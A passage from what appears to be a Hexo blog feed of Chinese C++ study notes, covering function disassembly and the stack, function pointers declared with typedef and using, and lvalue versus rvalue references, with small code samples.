c = Add(1,2);</code>的反汇编，在跳转到Add函数前，编译器push了两个值分别是2和1，这正好是我们传递给Add的参数，只不过是后面的先push进去。</p><ol><li>ebp 可以叫做栈底寄存器</li><li>esp 可以叫做栈顶寄存器</li><li>栈的内存地址生长方式是由高到低</li></ol><p><code>00FC1003  mov         eax,dword ptr [ebp+8]</code>，就是将ebp+8这个地址里的值赋给eax寄存器，ebp在跳转到函数的时候就被赋予了esp的值，大概就是传递了一个临时变量的值。<br><code>00FC1006  add         eax,dword ptr [ebp+0Ch]</code>，这里又让eax add 加上 ebp+0C这块地址里的值，0C和8的差是4，说明可能是int类型的数据。<br>然后pop ebp，把ebp弹出栈了。——目前还不太好解释<br>最后ret ，跟return似乎有关联，就是告诉编译器这段运行完了，可以回去了。</p><p>按照我个人的理解花了草图：</p><img src="/2022/06/01/function4/007.png" class=""><blockquote><p>红色是跳转到add函数的时候发生的，黑色则是main函数里面正常的情况。</p></blockquote><hr><img src="/2022/06/01/function4/006.png" class=""><p>编程语言-汇编-机器码<br>我们通过反汇编得到的不管是左边的内存地址还是右边的指令都还是人为能够看明白的操作，而中间的8B EC那些才是存在本地硬盘上让机器读取的。</p><blockquote><p>ps : 还有一层二进制数据没转化</p></blockquote><hr><p>再反汇编的时候，我们看到call 函数地址，说明了函数也有内存地址。</p><img src="/2022/06/01/function4/008.png" class=""><p>直接打印就可以得到地址。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *p = (<span class="type">char</span> *)Add;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">30</span>; i++)&#123;   <span class="comment">//30是随便指定的，程序经过优化后谁也不确定函数的内容到底有多少，只有编译完成后才能知道</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%02X\n&quot;</span>, p[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>既然是地址，就能通过地址显示内容，但是函数里的内容会是什么？</p><img src="/2022/06/01/function4/009.png" class=""><p>这样看还是有点不直观，可能因为p[i]被当成指针地址四个字节四个四个字节读取了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *p = (<span class="type">char</span> *)Add;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">30</span>; i++)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%02X\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">char</span>)p[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把他强转成无符号的char类型数据，再次打印：</p><img src="/2022/06/01/function4/010.png" class=""><p>发现似乎有点眼熟？<br>对比我们之前截的图，在显示了代码字节的情况下【中间部分】：</p><img src="/2022/06/01/function4/006.png" class=""><p>跟函数内存储的字节是一模一样的顺序下去。</p><blockquote><p>想看二进制的可以引用头文件bitset来着，然后std::bitset&lt;8&gt;控制二进制流输出<br>不过反正也看不懂。16进制都很勉强了。</p></blockquote><hr><h2 id="函数指针"><a href="#函数指针" class="headerlink" title="函数指针"></a>函数指针</h2><p>在C语言和c++里，只要是有内存地址，就会被指针拿来玩。</p><p>对于指针函数，很好理解就是返回一个指针的函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span>* <span class="title">hhh</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *; <span class="comment">//例如这样，当然实际不可取。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于函数而言，比较重要的是参数和返回值，在反汇编中，函数的地址</p><p><strong>那么如何定义一个函数指针？</strong><br><code>函数返回类型 (*函数指针变量名)(参数类型 参数名称，......)</code><br>例如<code>int (*pAdd)(int a, int b);</code><br>当然void类型依旧可以使用。<br>其次就是参数的问题，形参不仅是接受传递进来的值，形参名在函数内实现会被用到，但是定义的时候是可以忽略形参名的，比如<code>int (*pAdd)(int , int );</code>，毕竟他可以指向一个函数，关键点还是在于那个函数怎么实现。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> (*pAdd)(<span class="type">int</span> a, <span class="type">int</span> b) = Add;</span><br><span class="line"><span class="type">int</span> x = <span class="built_in">pAdd</span>(<span class="number">5</span>, <span class="number">6</span>);</span><br><span class="line">std::cout &lt;&lt; x &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><p>打印后结果：<img src="/2022/06/01/function4/011.png" class=""></p><blockquote><p>函数指针也是指针，所以它的大小也不用多说，x86下自然为4字节，x64下为8字节。<br>有疑问可以自己sizeof查看。不过这是基础概念了。</p></blockquote><p>当遇上类型不同的函数时，万能的强转大法又回来了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">float</span> <span class="title">Add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">int</span> (*pAdd)(<span class="type">int</span> a, <span class="type">int</span> b) = (<span class="built_in">int</span> (*)(<span class="type">int</span>,<span class="type">int</span>))Add;</span><br><span class="line"><span class="type">int</span> x = <span class="built_in">pAdd</span>(<span class="number">5</span>, <span class="number">6</span>);</span><br><span class="line">std::cout &lt;&lt; x &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>格式如代码所示，依旧是采用<code>返回类型 * 参数类型，参数类型</code><br><strong>注：即使函数原型返回类型是float，但是强转之后为int，当输出的时候也会隐转成int类型，float转int的特定就是没有四舍五入的说法，直接抹去小数点后面的</strong></p><img src="/2022/06/01/function4/012.png" class=""> 可以看到（5+6）/2应该是5.5，但是强转的时候改变了类型，所以结果变成了5。<p>强转成char的话，如果在ASCII码内，就可以打印正常的字符，不然出现乱码也说不定。</p><p>但是相比较，函数指针的写法有点长，虽然cv码农问题不大，但是之前C语言学过<code>typedef</code>，这里就能用上</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span><span class="params">(*piAdd)</span><span class="params">(<span class="type">int</span>, <span class="type">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">char</span><span class="params">(*pcAdd)</span><span class="params">(<span class="type">int</span>, <span class="type">int</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">float</span> <span class="title">Add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b)/<span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">piAdd pAdd= (piAdd)Add;</span><br><span class="line"><span class="type">int</span> x = <span class="built_in">pAdd</span>(<span class="number">5</span>, <span class="number">6</span>);</span><br><span class="line">std::cout &lt;&lt; x &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样看上去整体简洁一些，带有C语言的味道，而c++则是可以通过using实现</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> pI_Add = <span class="built_in">int</span>(*)(<span class="type">int</span>, <span class="type">int</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">float</span> <span class="title">Add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (a + b)/<span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    pI_Add pi = (pI_Add)Add;</span><br><span class="line"><span class="type">int</span> y = <span class="built_in">pi</span>(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果也是一样一样的。</p><p>总结就是三种声明办法：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span><span class="params">(*piAdd)</span><span class="params">(<span class="type">int</span>, <span class="type">int</span>)</span></span>;      <span class="comment">//声明函数指针类型</span></span><br><span class="line"><span class="keyword">using</span> pI_Add = <span class="built_in">int</span>(*)(<span class="type">int</span>, <span class="type">int</span>);    <span class="comment">//声明函数指针类型</span></span><br><span class="line"><span class="built_in">int</span> (*pAdd)(<span class="type">int</span>,<span class="type">int</span>) = Add;         <span class="comment">//声明函数指针变量</span></span><br></pre></td></tr></table></figure><p>然后就是结构体参数的时候</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="type">int</span> b;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">sum</span><span class="params">(Box box)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> box.a + box.b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">Box box&#123;<span class="number">1</span>,<span class="number">2</span>&#125;;</span><br><span class="line">std::cout &lt;&lt; <span class="built_in">sum</span>(box) &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/01/function4/013.png" class=""><p>结果自然是3，但是写成函数指针的时候，参数如何操作。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="type">int</span> b;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">using</span> pBox = <span class="built_in">int</span>(*)(Box);   <span class="comment">//这样写自然没错，但是要先声明结构体Box，容易造成误会</span></span><br></pre></td></tr></table></figure><img src="/2022/06/01/function4/014.png" class=""><p>当然结构体原型就是两个int类型的参数，所以直接使用两个形参效果也ok的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> pBox = <span class="built_in">int</span>(*)(<span class="type">int</span>,<span class="type">int</span>);</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    pBox pb = (pBox)sum;            <span class="comment">//函数指针的参数不再是结构体，所以需要强转</span></span><br><span class="line">std::cout &lt;&lt; <span class="built_in">pb</span>(<span class="number">2</span>,<span class="number">4</span>) &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果如图：<img src="/2022/06/01/function4/015.png" class=""><br>当然不用2，4用box的参数也无可厚非，意义是相同的：<img src="/2022/06/01/function4/016.png" class=""></p><p>转到反汇编查看当传递结构体进去时发生的变化：</p><img src="/2022/06/01/function4/017.png" class=""><blockquote><p>call 不用多说，就是跳转到sum这个函数去，那么在跳转之前先传递了两个值<br>一个ebp-8 一个ebp-0C其实也就是ebp-12，两者差4，说明极有可能就是结构体内的参数</p></blockquote><p>打开显示符号名，发现：<img src="/2022/06/01/function4/018.png" class=""></p><blockquote><p>ebp-0C变成box结构体变量名了<br>参照之前百度，栈的内存地址是由高到低，由右向左<br>故此推测ebp-12是box.a的值，而ebp-8那块地址上就是box.b的值</p></blockquote><p>再到地址栏那块输入0x00b31000,跳转至sum函数处：</p><img src="/2022/06/01/function4/019.png" class=""><p>也就是说先将a的值传给eax寄存器，再将b的值给eax相加最后返回。</p><hr><h2 id="自己推敲一下反汇编"><a href="#自己推敲一下反汇编" class="headerlink" title="自己推敲一下反汇编"></a>自己推敲一下反汇编</h2><p><strong>注：项目属性关于c&#x2F;c++的优化处于禁用状态，然后模式为release</strong><br>之所以这么改是因为debug的内容比较多，再加上优化的话更不适合新手推敲了。</p><img src="/2022/06/01/function4/020.png" class=""><blockquote><p>在主函数压入栈时，push ebp，ebp那会的值是005DFEFC</p></blockquote><img src="/2022/06/01/function4/021.png" class=""><blockquote><p>单步调试，esp的值还没同步ebp，等mov这条指令走完之后看到</p></blockquote><img src="/2022/06/01/function4/022.png" class=""><blockquote><p>现在看到esp和ebp持平了。sub是减法的意思，再往下走</p></blockquote><img src="/2022/06/01/function4/023.png" class=""><blockquote><p>esp-0c得到的结果就是005DFEA8，ebp不变</p></blockquote><p>用画图表示大概就是这样：<img src="/2022/06/01/function4/024.png" class=""><br>然后在看后面的汇编：<img src="/2022/06/01/function4/025.png" class=""><br>自己画图表示的话大概是：<img src="/2022/06/01/function4/026.png" class=""><br><strong>然后我就发现不对劲的地方。。sum和add好像还是被优化了，因为两个效果好像类似，所以函数地址居然都是指向了add</strong><br>也就是：<img src="/2022/06/01/function4/027.png" class=""><br>既然已经被优化了那就先不管了。</p><img src="/2022/06/01/function4/028.png" class=""><p>add函数里的两个算是常量了，都被直接push进去，然后call到add函数位置。<br>至于<code>sum(box)</code>，因为在上面初始化box的时候就看到了1和2存在哪个地址了，所以这里看起来并不费劲。<br>ebp-8存的2，ebp-0c存的1，都分别把值传给一个寄存器，然后push进函数。</p><p>最后输出的那句：<img src="/2022/06/01/function4/029.png" class=""><br>前面也不难看懂，第一个push不知道是不是std流，先不管，然后传递box.b的值给edx，在push edx；传递box.a的值给eax，在push进去；call ebp-4的地址上就是我们声明的pb函数指针。最后面那几句还真不之地干啥的目前。</p><hr><h2 id="自定义函数指针做形参"><a href="#自定义函数指针做形参" class="headerlink" title="自定义函数指针做形参"></a>自定义函数指针做形参</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> pI_Add = <span class="built_in">int</span>(*)(<span class="type">int</span>, <span class="type">int</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">test</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, pI_Add pa)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">pa</span>(a, b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="built_in">test</span>(<span class="number">1</span>,<span class="number">20</span>,Add) &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果自然显而易见：<img src="/2022/06/01/function4/030.png" class=""></p><p>虽然以现在案例的复杂度肯定用不上，等以后了没准还真有这种写法。</p><hr><p>函数指针和指针函数？</p><p>指针函数就是指一个返回值是指针的函数<br>而函数指针虽然本身也是一个指针，但是它是指向一个特定类型的函数，它的返回值看的是指向的函数。</p><p>硬要区分的话函数指针的变量名带阔号了哈哈哈！</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>六一的快乐停留在了幼稚园~</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>function3-左值右值</title>
      <link href="/2022/05/31/function3/"/>
      <url>/2022/05/31/function3/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在C语言中什么叫左值和右值</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">3</span>;</span><br><span class="line"><span class="comment">//a为左值，3为右值</span></span><br></pre></td></tr></table></figure><ul><li>左值一般是变量，在程序运行时有一个准确的地址和值，除了const的情况下一般都能修改。</li><li>右值则一般是常量或者临时对象，除非强转之类的操作，其它情况下一般不能修改</li></ul><blockquote><p>在编译报错的时候应该或多或少也见过到提示右值不可被修改</p></blockquote><span id="more"></span><p>不过上述的说法也并不绝对</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> b = <span class="number">2</span>;</span><br><span class="line">a = b;</span><br></pre></td></tr></table></figure><p>这里的右值b它是一个变量。</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">AddSum</span><span class="params">(<span class="type">int</span> a)</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; a &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="built_in">AddSum</span>(<span class="number">10</span> + <span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/05/31/function3/000.png" class=""><blockquote><p>在正常情况下，int a &#x3D; 10; 编译器把10转换成十六进制赋值给ebp-8的位置上<br>而调用函数传参的时候使用算术表达式他也会默认先算好，可能这里函数的反汇编不明显<br>稍微改动一下让a+10+20</p></blockquote><img src="/2022/05/31/function3/001.png" class=""><blockquote><p>这里就很清楚的看到编译器先将ebp-8的地址传给eax寄存器，然后eax寄存器在加上1E,也就是30</p></blockquote><p>正常的变量作为左值都好解释，数组和指针的时候：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> array[<span class="number">10</span>];</span><br><span class="line"><span class="type">int</span> *p = array;     <span class="comment">//array是数组，默认表示数组首地址array[0]。所以不需要加&amp;。</span></span><br><span class="line"></span><br><span class="line">array[<span class="number">0</span>];<span class="comment">//属于一个合格的左值，有具体位置</span></span><br><span class="line">*p 和 p <span class="comment">//也属于左值，*p在此处表示array[0]的地址，而p本身是个指针，指针也有他自己的地址</span></span><br><span class="line"></span><br><span class="line">&amp;array[<span class="number">0</span>]; <span class="comment">//就不属于了，这个标识array[0]的地址，做不了左值</span></span><br><span class="line"></span><br><span class="line">*(p+<span class="number">1</span>); <span class="comment">//这个就有点意思了，其实就是array[1],或者说p[1]</span></span><br><span class="line">p+<span class="number">1</span>; <span class="comment">//就不对头了，这只是让地址单纯偏移一个类型长度，得到的是地址，</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="左值引用和右值引用"><a href="#左值引用和右值引用" class="headerlink" title="左值引用和右值引用"></a>左值引用和右值引用</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> &amp;b = a; <span class="comment">//b引用了a</span></span><br><span class="line"><span class="type">int</span> &amp;&amp;c = b;    <span class="comment">//但此处引用c不能引用b，这种多级套娃的形式在指针里是可以的</span></span><br><span class="line"><span class="comment">//引用的原则就是int &amp;c = b;这样是合法的。</span></span><br></pre></td></tr></table></figure><img src="/2022/05/31/function3/002.png" class=""><p>编译器提示无法将 右值引用绑定到左值，</p><p>那么两个&amp;该怎么用：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> &amp;&amp;c = <span class="number">150</span>+<span class="number">120</span>;</span><br></pre></td></tr></table></figure><p>显然是给他引用一个右值为这种算术表达式。但是注意修改c没有太大意义，因为右值是固定的。<br>那么右值引用的场景在哪。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">AddSum</span><span class="params">(<span class="type">int</span> &amp;a)</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; a &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> &amp;b = a; </span><br><span class="line"><span class="type">int</span> &amp;&amp;c = <span class="number">150</span>+<span class="number">120</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">AddSum</span>(a + <span class="number">150</span> + <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/05/31/function3/003.png" class=""><p>当函数参数为左值引用时，没办法传递表达式进去，所以右值引用的场景就来了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">AddSum</span><span class="params">(<span class="type">int</span> &amp;&amp;a)</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; a &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> &amp;b = a; </span><br><span class="line"><span class="type">int</span> &amp;&amp;c = <span class="number">150</span>+<span class="number">120</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">AddSum</span>(a + <span class="number">150</span> + <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然可以先用一个变量接受这个表达式：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">AddSum</span><span class="params">(<span class="type">int</span> &amp;a)</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; a &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> &amp;b = a; </span><br><span class="line"><span class="type">int</span> &amp;&amp;c = <span class="number">150</span>+<span class="number">120</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> x = a + <span class="number">150</span> + <span class="number">200</span>;</span><br><span class="line"><span class="built_in">AddSum</span>(x);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个是没啥问题，语义是通顺的。</p><img src="/2022/05/31/function3/004.png" class=""><img src="/2022/05/31/function3/005.png" class=""><blockquote><p>int x毕竟是额外开辟了内存空间去保存这个表达式的值，虽然临时变量也会占内存，但是至少临时变量销毁比局部变量快。</p></blockquote><hr><h2 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h2><p>&amp;在C语言中，我们通俗的说是取地址符，而在cpp中多了引用的概念<br>区分的方式就是 参照 &#x3D;<br>当&amp; 在变量定义区域，表示引用：<code>int &amp;b = a</code><br>当&amp; 在变量操作区域，表示取地址：<code>int *p = &amp;a;</code></p><p>然后来个玄乎的 <code>&amp;*p 和 *&amp;p</code>，在变量定义区域时：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> *p = &amp;a;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> *&amp;p1 = p;   <span class="comment">//合法</span></span><br><span class="line"><span class="type">int</span> &amp;*p2 = p;   <span class="comment">//不合法</span></span><br></pre></td></tr></table></figure><p><code>int *&amp;p1 = p</code>先当与指向一个引用，指针引用。<br><code>int &amp;*p2 = p</code>引用一个指针显然是不对的。引用本身就是一个弱化版本的指针，编译器也提示错误<img src="/2022/05/31/function3/006.png" class=""></p><p>在变量操作时：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">std::cout &lt;&lt; *&amp;a &lt;&lt; std::endl;  <span class="comment">//合法，相当于*(&amp;a),其实就是做了一次解引用的操作，指向a的地址，使用起来就是a的值。</span></span><br><span class="line">std::cout &lt;&lt; &amp;*a &lt;&lt; std::endl;  <span 